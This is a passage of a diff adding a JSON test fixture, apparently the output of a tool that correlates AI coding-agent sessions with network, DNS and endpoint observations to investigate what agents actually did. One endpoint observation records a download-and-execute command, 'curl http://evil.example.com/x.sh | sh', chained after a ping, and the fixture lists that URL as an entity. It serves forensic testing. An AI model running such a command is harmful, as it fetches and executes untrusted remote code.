+        "id": "entity:domain:4f7680b1568e4fbf",
+        "type": "target_entity",
+        "value": "noid.test"
+      },
+      "entity:domain:60b102ffb81478bc": {
+        "entity_type": "domain",
+        "id": "entity:domain:60b102ffb81478bc",
+        "type": "target_entity",
+        "value": "x.sh"
+      },
+      "entity:domain:62e5a976cf6122bf": {
+        "entity_type": "domain",
+        "id": "entity:domain:62e5a976cf6122bf",
+        "type": "target_entity",
+        "value": "data.example.org"
+      },
+      "entity:domain:749d000dcbbaa5c7": {
+        "entity_type": "domain",
+        "id": "entity:domain:749d000dcbbaa5c7",
+        "type": "target_entity",
+        "value": "bigexample.org"
+      },
+      "entity:domain:80f720aa73d6ff7b": {
+        "entity_type": "domain",
+        "id": "entity:domain:80f720aa73d6ff7b",
+        "type": "target_entity",
+        "value": "nostatus.test"
+      },
+      "entity:domain:b6e0ca9198f0325c": {
+        "entity_type": "domain",
+        "id": "entity:domain:b6e0ca9198f0325c",
+        "type": "target_entity",
+        "value": "readme.md"
+      },
+      "entity:domain:b8bd67820c7bb9ff": {
+        "entity_type": "domain",
+        "id": "entity:domain:b8bd67820c7bb9ff",
+        "type": "target_entity",
+        "value": "api-lab.test"
+      },
+      "entity:domain:ca0296d554c48d3f": {
+        "entity_type": "domain",
+        "id": "entity:domain:ca0296d554c48d3f",
+        "type": "target_entity",
+        "value": "setup.py"
+      },
+      "entity:domain:e647c5f99474b3a0": {
+        "entity_type": "domain",
+        "id": "entity:domain:e647c5f99474b3a0",
+        "type": "target_entity",
+        "value": "config.json"
+      },
+      "entity:domain:ee8cf298f1e6ac52": {
+        "entity_type": "domain",
+        "id": "entity:domain:ee8cf298f1e6ac52",
+        "type": "target_entity",
+        "value": "main.py"
+      },
+      "entity:ip:4fa79423ef2fc7de": {
+        "entity_type": "ip",
+        "id": "entity:ip:4fa79423ef2fc7de",
+        "type": "target_entity",
+        "value": "192.0.2.1"
+      },
+      "entity:ip:72cab1571c87b285": {
+        "entity_type": "ip",
+        "id": "entity:ip:72cab1571c87b285",
+        "type": "target_entity",
+        "value": "10.0.0.9"
+      },
+      "entity:ip:80177af0d04ecc5c": {
+        "entity_type": "ip",
+        "id": "entity:ip:80177af0d04ecc5c",
+        "type": "target_entity",
+        "value": "10.0.0.5"
+      },
+      "entity:url:6268b6013df85e7f": {
+        "entity_type": "url",
+        "id": "entity:url:6268b6013df85e7f",
+        "type": "target_entity",
+        "value": "http://noid.test/a"
+      },
+      "entity:url:a7e93db8d73db900": {
+        "entity_type": "url",
+        "id": "entity:url:a7e93db8d73db900",
+        "type": "target_entity",
+        "value": "http://evil.example.com/x.sh"
+      },
+      "entity:url:ed9f4c2975f213e4": {
+        "entity_type": "url",
+        "id": "entity:url:ed9f4c2975f213e4",
+        "type": "target_entity",
+        "value": "https://api-lab.test/v1/health"
+      },
+      "event:cmd-01": {
+        "event_id": "cmd-01",
+        "evidence_state": "requested",
+        "id": "event:cmd-01",
+        "session_id": "codex:s1",
+        "source_agent": "codex",
+        "timestamp": "2026-10-19T01:00:00Z",
+        "type": "agent_event"
+      },
+      "event:cmd-02": {
+        "event_id": "cmd-02",
+        "evidence_state": "recorded",
+        "id": "event:cmd-02",
+        "session_id": "codex:s1",
+        "source_agent": "codex",
+        "timestamp": "2026-10-19T01:01:00Z",
+        "type": "agent_event"
+      },
+      "event:cmd-03": {
+        "event_id": "cmd-03",
+        "evidence_state": "recorded",
+        "id": "event:cmd-03",
+        "session_id": "s3",
+        "source_agent": "cursor",
+        "timestamp": "2026-10-19T01:03:00Z",
+        "type": "agent_event"
+      },
+      "event:msg-01": {
+        "event_id": "msg-01",
+        "evidence_state": "recorded",
+        "id": "event:msg-01",
+        "session_id": "s2",
+        "source_agent": "claude",
+        "timestamp": "2026-10-19T01:02:00Z",
+        "type": "agent_event"
+      },
+      "event:out-01": {
+        "event_id": "out-01",
+        "evidence_state": "recorded",
+        "id": "event:out-01",
+        "session_id": "s1",
+        "source_agent": "codex",
+        "timestamp": "2026-10-19T01:00:03Z",
+        "type": "agent_event"
+      },
+      "event:unidentified-event-5": {
+        "event_id": "unidentified-event-5",
+        "evidence_state": "recorded",
+        "id": "event:unidentified-event-5",
+        "session_id": null,
+        "source_agent": "codex",
+        "timestamp": null,
+        "type": "agent_event"
+      },
+      "observation:bad-status": {
+        "collection_status": "observed",
+        "id": "observation:bad-status",
+        "observation_id": "bad-status",
+        "observation_type": "network_connection",
+        "source_channel": "unknown",
+        "timestamp": null,
+        "type": "independent_observation"
+      },
+      "observation:dns-01": {
+        "collection_status": "observed",
+        "id": "observation:dns-01",
+        "observation_id": "dns-01",
+        "observation_type": "dns_response",
+        "source_channel": "network",
+        "timestamp": null,
+        "type": "independent_observation"
+      },
+      "observation:ep-01": {
+        "collection_status": "observed",
+        "id": "observation:ep-01",
+        "observation_id": "ep-01",
+        "observation_type": "process_create",
+        "source_channel": "endpoint",
+        "timestamp": null,
+        "type": "independent_observation"
+      },
+      "observation:ep-02": {
+        "collection_status": "observed",
+        "id": "observation:ep-02",
+        "observation_id": "ep-02",
+        "observation_type": "network_connection",
+        "source_channel": "endpoint",
+        "timestamp": null,
+        "type": "independent_observation"
+      },
+      "observation:multi-target": {
+        "collection_status": "observed",
+        "id": "observation:multi-target",
+        "observation_id": "multi-target",
+        "observation_type": "network_connection",
+        "source_channel": "network",
+        "timestamp": null,
+        "type": "independent_observation"
+      },
+      "observation:nc-01": {
+        "collection_status": "not_collected",
+        "id": "observation:nc-01",
+        "observation_id": "nc-01",
+        "observation_type": "network_connection",
+        "source_channel": "network",
+        "timestamp": null,
+        "type": "independent_observation"
+      },
+      "observation:net-01": {
+        "collection_status": "observed",
+        "id": "observation:net-01",
+        "observation_id": "net-01",
+        "observation_type": "network_connection",
+        "source_channel": "network",
+        "timestamp": "2026-10-19T01:00:02Z",
+        "type": "independent_observation"
+      },
+      "observation:net-02": {
+        "collection_status": "observed",
+        "id": "observation:net-02",
+        "observation_id": "net-02",
+        "observation_type": "network_connection",
+        "source_channel": "network",
+        "timestamp": "2026-10-19T01:01:01Z",
+        "type": "independent_observation"
+      },
+      "observation:observation:0009:559471229e53": {
+        "collection_status": "observed",
+        "id": "observation:observation:0009:559471229e53",
+        "observation_id": "observation:0009:559471229e53",
+        "observation_type": "process_create",
+        "source_channel": "harness",
+        "timestamp": null,
+        "type": "independent_observation"
+      },
+      "observation:srv-01": {
+        "collection_status": "observed",
+        "id": "observation:srv-01",
+        "observation_id": "srv-01",
+        "observation_type": "http_request",
+        "source_channel": "server",
+        "timestamp": "2026-10-19T01:00:02Z",
+        "type": "independent_observation"
+      }
+    },
+    "schema_version": "actf-investigation-graph-v1",
+    "statistics": {
+      "edges": 32,
+      "edges_by_relation": {
+        "COMMAND_REQUESTS": 8,
+        "CONTRADICTS": 1,
+        "CORROBORATES": 3,
+        "MENTIONS": 8,
+        "OBSERVES": 11,
+        "RESOLVES_TO": 1
+      },
+      "nodes": 33
+    }
+  },
+  "mentions": [
+    {
+      "assertion": "recorded",
+      "entity_id": "entity:domain:b8bd67820c7bb9ff",
+      "event_id": "cmd-01",
+      "evidence_refs": [
+        "sessions/one.jsonl:line:7"
+      ],
+      "field": "command",
+      "relation": "COMMAND_REQUESTS",
+      "session_id": "codex:s1",
+      "source_agent": "codex",
+      "timestamp": "2026-10-19T01:00:00Z"
+    },
+    {
+      "assertion": "recorded",
+      "entity_id": "entity:url:ed9f4c2975f213e4",
+      "event_id": "cmd-01",
+      "evidence_refs": [
+        "sessions/one.jsonl:line:7"
+      ],
+      "field": "command",
+      "relation": "COMMAND_REQUESTS",
+      "session_id": "codex:s1",
+      "source_agent": "codex",
+      "timestamp": "2026-10-19T01:00:00Z"
+    },
+    {
+      "assertion": "recorded",
+      "entity_id": "entity:domain:2dbe0e7fa5fb2b88",
+      "event_id": "cmd-02",
+      "evidence_refs": [
+        "sessions/one.jsonl:line:9"
+      ],
+      "field": "command",
+      "relation": "COMMAND_REQUESTS",
+      "session_id": "codex:s1",
+      "source_agent": "codex",
+      "timestamp": "2026-10-19T01:01:00Z"
+    },
+    {
+      "assertion": "recorded",
+      "entity_id": "entity:domain:60b102ffb81478bc",
+      "event_id": "cmd-02",
+      "evidence_refs": [
+        "sessions/one.jsonl:line:9"
+      ],
+      "field": "command",
+      "relation": "COMMAND_REQUESTS",
+      "session_id": "codex:s1",
+      "source_agent": "codex",
+      "timestamp": "2026-10-19T01:01:00Z"
+    },
+    {
+      "assertion": "recorded",
+      "entity_id": "entity:ip:80177af0d04ecc5c",
+      "event_id": "cmd-02",
+      "evidence_refs": [
+        "sessions/one.jsonl:line:9"
+      ],
+      "field": "command",
+      "relation": "COMMAND_REQUESTS",
+      "session_id": "codex:s1",
+      "source_agent": "codex",
+      "timestamp": "2026-10-19T01:01:00Z"
+    },
+    {
+      "assertion": "recorded",
+      "entity_id": "entity:url:a7e93db8d73db900",
+      "event_id": "cmd-02",
+      "evidence_refs": [
+        "sessions/one.jsonl:line:9"
+      ],
+      "field": "command",
+      "relation": "COMMAND_REQUESTS",
+      "session_id": "codex:s1",
+      "source_agent": "codex",
+      "timestamp": "2026-10-19T01:01:00Z"
+    },
+    {
+      "assertion": "recorded",
+      "entity_id": "entity:domain:e647c5f99474b3a0",
+      "event_id": "msg-01",
+      "evidence_refs": [],
+      "field": "text",
+      "relation": "MENTIONS",
+      "session_id": "s2",
+      "source_agent": "claude",
+      "timestamp": "2026-10-19T01:02:00Z"
+    },
+    {
+      "assertion": "recorded",
+      "entity_id": "entity:domain:62e5a976cf6122bf",
+      "event_id": "msg-01",
+      "evidence_refs": [],
+      "field": "text",
+      "relation": "MENTIONS",
+      "session_id": "s2",
+      "source_agent": "claude",
+      "timestamp": "2026-10-19T01:02:00Z"
+    },
+    {
+      "assertion": "recorded",
+      "entity_id": "entity:domain:b6e0ca9198f0325c",
+      "event_id": "msg-01",
+      "evidence_refs": [],
+      "field": "text",
+      "relation": "MENTIONS",
+      "session_id": "s2",
+      "source_agent": "claude",
+      "timestamp": "2026-10-19T01:02:00Z"
+    },
+    {
+      "assertion": "recorded",
+      "entity_id": "entity:domain:ca0296d554c48d3f",
+      "event_id": "msg-01",
+      "evidence_refs": [],
+      "field": "text",
+      "relation": "MENTIONS",
+      "session_id": "s2",
+      "source_agent": "claude",
+      "timestamp": "2026-10-19T01:02:00Z"
+    },
+    {
+      "assertion": "recorded",
+      "entity_id": "entity:domain:e647c5f99474b3a0",
+      "event_id": "cmd-03",
+      "evidence_refs": [],
+      "field": "command",
+      "relation": "COMMAND_REQUESTS",
+      "session_id": "s3",
+      "source_agent": "cursor",
+      "timestamp": "2026-10-19T01:03:00Z"
+    },
+    {
+      "assertion": "recorded",
+      "entity_id": "entity:domain:ee8cf298f1e6ac52",
+      "event_id": "cmd-03",
+      "evidence_refs": [],
+      "field": "command",
+      "relation": "COMMAND_REQUESTS",
+      "session_id": "s3",
+      "source_agent": "cursor",
+      "timestamp": "2026-10-19T01:03:00Z"
+    },
+    {
+      "assertion": "recorded",
+      "entity_id": "entity:domain:b8bd67820c7bb9ff",
+      "event_id": "out-01",
+      "evidence_refs": [],
+      "field": "tool_output",
+      "relation": "MENTIONS",
+      "session_id": "s1",
+      "source_agent": "codex",
+      "timestamp": "2026-10-19T01:00:03Z"
+    },
+    {
+      "assertion": "recorded",
+      "entity_id": "entity:ip:72cab1571c87b285",
+      "event_id": "out-01",
+      "evidence_refs": [],
+      "field": "tool_output",
+      "relation": "MENTIONS",
+      "session_id": "s1",
+      "source_agent": "codex",
+      "timestamp": "2026-10-19T01:00:03Z"
+    },
+    {
+      "assertion": "recorded",
+      "entity_id": "entity:domain:4f7680b1568e4fbf",
+      "event_id": "unidentified-event-5",
+      "evidence_refs": [],
+      "field": "text",
+      "relation": "MENTIONS",
+      "session_id": null,
+      "source_agent": "codex",
+      "timestamp": null
+    },
+    {
+      "assertion": "recorded",
+      "entity_id": "entity:url:6268b6013df85e7f",
+      "event_id": "unidentified-event-5",
+      "evidence_refs": [],
+      "field": "text",
+      "relation": "MENTIONS",
+      "session_id": null,
+      "source_agent": "codex",
+      "timestamp": null
+    }
+  ],
+  "method": {
+    "correlation_policy": "Cross-source event links require an explicit event identifier or an exact normalized command match; time proximity alone does not create a link.",
+    "entity_resolution_policy": "Canonicalized values are merged only within the same entity type. DNS observations create RESOLVES_TO relations, not identity merges.",
+    "entity_types": [
+      "domain",
+      "ip",
+      "url",
+      "host"
+    ],
+    "observation_policy": "Only supplied independent observations with collection_status=observed are treated as observed evidence."
+  },
+  "observations": [
+    {
+      "collection_status": "observed",
+      "command_line": null,
+      "contradicts_event_ids": [],
+      "evidence_refs": [
+        "netflow.csv:line:42"
+      ],
+      "extensions": {},
+      "file_path": null,
+      "hostname": null,
+      "notes": null,
+      "observation_id": "net-01",
+      "observation_type": "network_connection",
+      "process_id": null,
+      "related_event_ids": [
+        "cmd-01"
+      ],
+      "related_session_id": null,
+      "remote_host": "api-lab.test",
+      "remote_ip": null,
+      "return_code": null,
+      "source": "network_sensor",
+      "source_channel": "network",
+      "time_source": "independent_observation",
+      "timestamp": "2026-10-19T01:00:02Z",
+      "url": null
+    },
+    {
+      "collection_status": "observed",
+      "command_line": null,
+      "contradicts_event_ids": [],
+      "evidence_refs": [
+        "netflow.csv:line:50"
+      ],
+      "extensions": {},
+      "file_path": null,
+      "hostname": null,
+      "notes": null,
+      "observation_id": "net-02",
+      "observation_type": "network_connection",
+      "process_id": null,
+      "related_event_ids": [],
+      "related_session_id": null,
+      "remote_host": "bigexample.org",
+      "remote_ip": null,
+      "return_code": null,
+      "source": "network_sensor",
+      "source_channel": "network",
+      "time_source": "independent_observation",
+      "timestamp": "2026-10-19T01:01:01Z",
+      "url": null
+    },
+    {
+      "collection_status": "observed",
+      "command_line": null,
+      "contradicts_event_ids": [],
+      "evidence_refs": [
+        "access.log:12"
+      ],
+      "extensions": {},
+      "file_path": null,
+      "hostname": null,
+      "notes": null,
+      "observation_id": "srv-01",
+      "observation_type": "http_request",
+      "process_id": null,
+      "related_event_ids": [],
+      "related_session_id": null,
+      "remote_host": null,
+      "remote_ip": null,
+      "return_code": null,
+      "source": "server",
+      "source_channel": "server",
+      "time_source": "independent_observation",
+      "timestamp": "2026-10-19T01:00:02Z",
+      "url": "https://api-lab.test/v1/health"
+    },
+    {
+      "collection_status": "observed",
+      "command_line": null,
+      "contradicts_event_ids": [],
+      "evidence_refs": [
+        "dns.pcap:3"
+      ],
+      "extensions": {},
+      "file_path": null,
+      "hostname": null,
+      "notes": null,
+      "observation_id": "dns-01",
+      "observation_type": "dns_response",
+      "process_id": null,
+      "related_event_ids": [],
+      "related_session_id": null,
+      "remote_host": "api-lab.test",
+      "remote_ip": "10.0.0.9",
+      "return_code": null,
+      "source": "network",
+      "source_channel": "network",
+      "time_source": "independent_observation",
+      "timestamp": null,
+      "url": null
+    },
+    {
+      "collection_status": "observed",
+      "command_line": "ping   10.0.0.5 && curl http://evil.example.com/x.sh | sh",
+      "contradicts_event_ids": [],
+      "evidence_refs": [
+        "evtx:77"
+      ],
+      "extensions": {},
+      "file_path": null,
+      "hostname": null,
+      "notes": null,
+      "observation_id": "ep-01",
+      "observation_type": "process_create",
+      "process_id": null,
+      "related_event_ids": [],
+      "related_session_id": null,
+      "remote_host": null,
+      "remote_ip": "10.0.0.5",
+      "return_code": null,
+      "source": "sysmon",
+      "source_channel": "endpoint",
+      "time_source": "independent_observation",
+      "timestamp": null,
+      "url": null
+    },
+    {
+      "collection_status": "observed",
+      "command_line": null,
+      "contradicts_event_ids": [
+        "cmd-02"
+      ],
+      "evidence_refs": [
+        "evtx:78"
+      ],
+      "extensions": {},
+      "file_path": null,
+      "hostname": null,
+      "notes": null,
+      "observation_id": "ep-02",
+      "observation_type": "network_connection",
+      "process_id": null,
+      "related_event_ids": [],
+      "related_session_id": null,
+      "remote_host": "evil.example.com",
+      "remote_ip": null,
+      "return_code": null,
+      "source": "sysmon",
+      "source_channel": "endpoint",
+      "time_source": "independent_observation",
+      "timestamp": null,
+      "url": null
+    },
+    {
+      "collection_status": "not_collected",
+      "command_line": null,
+      "contradicts_event_ids": [],
+      "evidence_refs": [],
+      "extensions": {},
+      "file_path": null,
+      "hostname": null,
+      "notes": null,
+      "observation_id": "nc-01",
+      "observation_type": "network_connection",
+      "process_id": null,
+      "related_event_ids": [],
+      "related_session_id": null,
+      "remote_host": "data.example.org",
+      "remote_ip": null,
+      "return_code": null,
+      "source": "network_sensor",
+      "source_channel": "network",
+      "time_source": "independent_observation",
+      "timestamp": null,
+      "url": null
+    },
+    {
+      "collection_status": "observed",
+      "command_line": null,
+      "contradicts_event_ids": [],
+      "evidence_refs": [],
+      "extensions": {},
+      "file_path": null,
+      "hostname": null,
+      "notes": null,
+      "observation_id": "bad-status",
+      "observation_type": "network_connection",
+      "process_id": null,
+      "related_event_ids": [],
+      "related_session_id": null,
+      "remote_host": "nostatus.test",
+      "remote_ip": null,
+      "return_code": null,
+      "source": "unknown",
+      "source_channel": "unknown",
+      "time_source": "independent_observation",
+      "timestamp": null,
+      "url": null
+    },
+    {
+      "collection_status": "observed",
+      "command_line": null,
+      "contradicts_event_ids": [],
+      "evidence_refs": [
+        "netflow.csv:99"
+      ],
+      "extensions": {},
+      "file_path": null,
+      "hostname": null,
+      "notes": null,
+      "observation_id": "multi-target",
+      "observation_type": "network_connection",
+      "process_id": null,
+      "related_event_ids": [
+        "cmd-02"
+      ],
+      "related_session_id": null,
+      "remote_host": "api-lab.test",
+      "remote_ip": null,
+      "return_code": null,
+      "source": "network_sensor",
+      "source_channel": "network",
+      "time_source": "independent_observation",
+      "timestamp": null,
+      "url": null
+    },
+    {
+      "collection_status": "observed",
+      "command_line": null,
+      "contradicts_event_ids": [],
+      "evidence_refs": [
+        "h:1"
+      ],
+      "extensions": {},
+      "file_path": null,
+      "hostname": null,
+      "notes": null,
+      "observation_id": "observation:0009:559471229e53",
+      "observation_type": "process_create",
+      "process_id": null,
+      "related_event_ids": [],
+      "related_session_id": null,
+      "remote_host": null,
+      "remote_ip": "192.0.2.1",
+      "return_code": null,
+      "source": "harness",
+      "source_channel": "harness",
+      "time_source": "independent_observation",
+      "timestamp": null,
+      "url": null
+    }
+  ],
+  "schema_version": "actf-investigation-v1",
+  "statistics": {
+    "candidate_count": 17,
+    "entities": 17,
+    "events": 6,
+    "independent_observations": 10,
+    "recorded_mentions": 16
+  }
+}
